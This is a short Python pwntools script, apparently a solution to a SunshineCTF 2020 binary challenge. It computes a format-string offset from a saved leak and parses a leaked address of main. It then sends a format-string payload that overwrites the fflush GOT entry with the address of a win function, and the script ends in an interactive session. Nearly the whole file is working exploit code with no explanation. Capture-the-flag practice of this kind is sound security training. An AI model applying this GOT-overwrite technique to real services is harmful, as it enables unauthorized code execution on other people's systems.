from pwn import *

binary = context.binary = ELF('./chall_12')
offset = 0
f = open('res.txt')
for line in f:
    for word in line.split():
        offset += 1
        print(word,end = ' ')
        if word == '41414141':
            break
f = open('res.txt')
sub = len(f.readline().split())
print('sub: ', sub)
offset -= sub

print('Offset: ', offset)
p = remote('chal.2020.sunshinectf.org',30012)
p.recvuntil('Just a single second: ')
realmain = int(p.recvline().strip(),16)
print('Main real: ', realmain)

buffer_func_win = binary.sym.main - binary.sym.win
buffer_func_fflush = binary.got.fflush - binary.sym.main

payload = b''
payload = fmtstr_payload(offset,{realmain+buffer_func_fflush:realmain-buffer_func_win})
print('Payload: ',payload)
p.sendline('IxZ')
p.sendline(payload)
p.interactive()
